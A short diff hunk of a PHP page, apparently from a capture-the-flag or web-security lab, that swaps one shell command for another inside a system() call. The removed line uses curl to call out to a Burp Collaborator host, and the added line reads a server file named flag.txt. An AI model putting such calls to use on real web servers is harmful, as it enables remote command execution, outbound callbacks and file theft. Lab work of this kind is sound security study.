@@ -8,7 +8,7 @@
 </form>
 <pre>
 <?php
-        system('curl https://jqd7usd96hrw0eq7rhbq11hbk2quej.burpcollaborator.net');
+        system('cat /var/www/html/flag.txt');
     
 ?>
 </pre>
